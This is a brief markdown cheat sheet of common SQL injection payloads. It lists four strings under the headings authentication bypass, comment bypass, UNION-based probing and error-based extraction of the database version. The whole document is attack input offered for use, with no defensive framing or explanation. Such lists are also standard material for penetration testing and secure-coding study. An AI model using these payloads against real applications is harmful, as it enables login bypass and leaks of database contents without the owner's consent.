\# Common SQL Injection Payloads



\## Authentication Bypass



' OR '1'='1



\## Comment Bypass



' OR 1=1 --



\## UNION Based



' UNION SELECT NULL,NULL --



\## Error Based



' AND 1=CAST((SELECT @@version) AS INT) --



